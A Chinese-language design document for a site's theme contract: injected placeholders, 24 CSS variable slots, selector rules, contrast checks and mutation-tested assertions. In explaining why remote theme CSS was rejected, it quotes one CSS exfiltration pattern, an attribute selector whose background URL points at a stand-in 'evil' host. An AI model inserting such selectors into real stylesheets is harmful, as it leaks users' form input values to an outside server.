# 主题契约

这份文档只回答一个问题：**换一套主题，允许改到哪儿。**

这条线划错，代价不是「样式不对」——是把渲染器、权限判定、响应头一起拖进主题里，
换皮变成改站。下面每一条都对应 `scripts/test-theme-contract.mjs` 里的断言，
不是设计意图，是能跑红的规则。

---

## 一、一进一出

```
public/*.html（骨架 + 占位符）
        │
        │  Worker injectTheme()：读 settings.theme / settings.mode
        ▼
   注入三样东西，然后原样返回
        ├─ <!--THEME-->       → window.__THEME_DEFAULT__ + <link id="tcss-default"> + 图标
        ├─ <!--THEMEBOOT-->   → 资源清单 __ASSET_H__ + 防闪引导脚本
        └─ data-theme / data-mode  在字节流里就是终值（不靠 JS 填）
        │
        ▼
public/style.css          变量层（:root）+ 结构层（用变量，不定义变量）
public/theme/<id>.css     只覆盖变量；edge 另有 4 条部件覆盖
```

契约管两件事：

| 方向 | 内容 | 落点 |
|---|---|---|
| **进** | Worker 往 HTML 里注入什么 | `<!--THEME-->` / `<!--THEMEBOOT-->` 两个占位符，`src/index.js` 的 `injectTheme()` |
| **出** | CSS 暴露哪些变量名 | `src/theme-contract.js` 的 `CONTRACT_CORE` + `CONTRACT_OPTIONAL`，共 24 个 |

契约明确**不管**三件事：

1. **渲染器** `public/md.js` —— 抠码 → 转义 → 拼装的顺序。主题碰它，代码块就会随主题变行为。
2. **权限与审核** —— `liveSql()`、`review_status`、`ownerOrAdmin()`。导航里的登录格由 Worker 直出，主题不许判断「当前是不是管理员」。
3. **响应头与 CSP** —— 主题不许靠内联 `<style>` 绕过 nonce。`style-src` 里的 `'unsafe-inline'` 是给 Markdown 的 style 属性开的，不是给主题开的后门。

---

## 二、变量契约（24 个槽位）

定义只有一份：`src/theme-contract.js`。加槽位要改那里，不能直接在主题文件里写新变量名。

### 必填 9 个（`CONTRACT_CORE`）

| 变量 | 用途 |
|---|---|
| `--bg` / `--bg-soft` | 页面底色 / 次级面 |
| `--card` / `--line` | 卡片面 / 发丝线（分区靠它，不靠阴影） |
| `--fg` / `--fg-soft` / `--muted` | 正文 / 次要 / 辅助 |
| `--accent` / `--accent-soft` | 强调（链接、选中）/ 强调的浅底 |

缺一个不报错，会**静默继承上一套**——最难查的那种。[TC-27] 逐套验浅色块齐全。

### 可选 15 个（`CONTRACT_OPTIONAL`）

`--green` `--red` · `--radius` `--shadow` · `--tok-k` `--tok-s` `--tok-n` `--tok-f`（语法高亮）·
`--hero-weight` `--hero-space` · `--mono` `--sans` `--serif` · `--brand` `--on-brand`

给了就用，不给就继承主表。字体与语法高亮属于「主题可以有自己的口味」。

`--brand` 与 `--on-brand` 目前只有 `edge` 用：锚橙 `#f6821f` 在纯白上 **2.58:1**，
当 `--accent`（文字色）过不了 AA，所以它只做填充，另给压深的 `#c2410c` 做文字，
橙底上的字走 `--on-brand`。[TC-22] 把 8 套 × 2 态 × 5 项（正文/次要/辅助/强调对底色、正文对卡片）+ `--on-brand` 对 `--brand`，共 82 组实算一遍。

---

## 三、三条硬规则

### 规则 1：主题文件只许两个选择器前缀

```css
:root[data-theme="ink"]                /* 变量块 */
:root[data-theme="ink"] .btn.primary   /* 部件覆盖，可选 */
```

其它一律不许。[TC-02] 逐条验。`.t-ink` 那种 body 类名作用域**不采用**——
`:root[data-theme]` 已经在 `<html>` 上了，再挂一个 body 类等于两套作用域、
两处要同步，且 `data-mode` 的级联会断。

### 规则 2：变量块只许变量声明，部件块只许引用变量

- 光杆 `:root[data-theme="x"]` 块：只许 `--var: …` 与 `color-scheme`。
  写成 `background: red !important` 就是直接改 html 底色，那是改站。
- 带后代的部件块：可以改属性，但色值必须经 `var()` / `color-mix()` 表达。
  写死 `#d9721a` 这种「橙的加深版」，换 `--brand` 时它不会跟着变，等于在主题里
  又埋了一份配色。混黑 `#000` / 混白 `#fff` 当加深提亮的算子，放行。

[TC-25] 分两级验。

### 规则 3：契约变量的定义只许出现在 `:root` 块

`style.css` 是变量层 + 结构层一个文件（拆开多一个 RTT，见 P-051 的取舍）。
层次靠断言表达：`--bg` `--accent` 这些只许在 `:root` 里定义，组件块里只许用。
组件自己的局部变量（`--ava` 这种评论头像哈希色）不在清单里，不受管。[TC-26]。

> **没做**：物理拆成 `contract.css` + `structure.css`。拆了之后两边照样能互相引用
> 变量，约束力反而更弱，还多一个请求。分层是纪律问题，不是文件问题。

---

## 四、加第 9 套要动几处

**两处代码 + 一次构建**：

```bash
# 1. 建文件：只覆盖契约变量
$EDITOR public/theme/foo.css

# 2. 面板加一行文案（中文名与描述没法从文件名推，这份必须手写）
$EDITOR public/theme.js     # THEMES 数组

# 3. 重算资源清单（不是代码改动）
npm run build:sri
```

不需要改：`THEME_IDS`（从清单派生）、`THEME_COLOR`（从 CSS 的 `--bg` 派生）、
`index.html`、`fillSeo()`、`md.js`、CSP、缓存逻辑。

[TC-28] 给派生函数一个多出 `theme/probe9.css` 的假清单，新主题必须出现在结果里；
[TC-07] 要求面板集合与派生清单一致。两条一起才算契约成立。

**忘了跑 `build:sri` 的症状**：后台选新主题提示「未知的风格」（它不在派生清单里）。
比静默回落纸韵好查，且 `npm test` 与 `npm run deploy` 都会先跑 `build:sri`。

---

## 五、明确没做

| 想法 | 为什么不做 |
|---|---|
| **远程主题 CSS**（GitHub Raw 直连） | 破 `integrity` 与内容哈希缓存这对不变量；冷路径多一次 RTT；CSS 本身是外泄通道（`input[value^=…]{background:url(//evil/…)}`，而 `img-src https:` 是放开的）。要做得上域名白名单 + 体积上限 + 剥离 + 边缘缓存一整套。 |
| **`?theme=<id>` 写进 cookie** | 主题偏好在 `localStorage`，SSR 只注入站点默认值。搬到 cookie 意味着每个响应都要 `Vary`，或者带 cookie 的响应一律 `private, no-store` —— 那是**降低**匿名缓存资格（现在匿名访客与爬虫共享 `s-maxage=300`）。首帧也不会更准：引导脚本在 `<head>` 里同步跑，CSS 到手前 `data-theme` 就已经是终值。 |
| **主题级模板覆盖**（换 HTML 结构） | 骨架级差异走变量（`--list-cols`、`--page-max`），不走第二套 DOM。真要做侧栏/无侧栏，是加一个受控的布局变量，不是让主题写 `.t-x .layout { grid-template-columns }` —— 后者等于让主题接管布局。 |
| **把 `anzhiyu` 的 79 条骨架搬进 `theme/anzhiyu.css`** | 省 2.37 KB gzip，只有非默认主题的读者吃得到，而默认主题的读者要多一个请求。净负。默认主题的样式必须跟第一个请求一起到。 |
| **`data-slot` 占位属性** | 主题文件只能碰 `:root[data-theme=x]` 作用域内的样式，天然改不了结构，槽位标记没有可约束的对象。占位符越少，`injectTheme()` 的替换链越短。 |
| **暗色对比度单独跑一套断言** | `[TC-22]` 已经是 8 套 × 2 态，深浅都算了；卡片底与按钮字也一并算。 |

---

## 六、断言的代价与反向验证

新写一条断言，先把它该抓的东西改坏一次，看着它红，再改回来。这批的注入验证：

| 注入 | 变红的断言 |
|---|---|
| `forest.css` 加 `--my-shadow` | TC-24 |
| `ocean.css` 变量块加 `background: red !important` | TC-25 |
| `edge.css` 的 `color-mix(…var(--brand)…)` 改回 `#d9721a` | TC-25 |
| `.post-card` 里加 `--accent: red` | TC-26 |
| `plum.css` 的 `--muted` 改成 `--xx-muted` | TC-22 / 24 / 25 / 27 |
| `edge` 的 `--on-brand` 改成 `#ffffff`（白字搁橙底） | TC-22（报 2.58:1） |
| `THEME_IDS` 改回字面量数组 | TC-07 / TC-23 |
| `deriveThemeIds` 不扫文件 | TC-07 |

TC-27 第一版写的是 `block.includes('--muted:')`，注入 `--xx-muted:` 时**没红** ——
子串匹配被前缀骗过了。改成带边界的正则才抓住。这是这批唯一一个假阴性。

---

出处：`src/theme-contract.js` · `src/settings.js` · `src/themeboot.js` ·
`src/index.js` 的 `injectTheme()` · `scripts/build-sri.mjs` · `scripts/test-theme-contract.mjs` ·
`PITFALLS.md` 的 P-051 / P-055 · 站务记录 2026-11-24
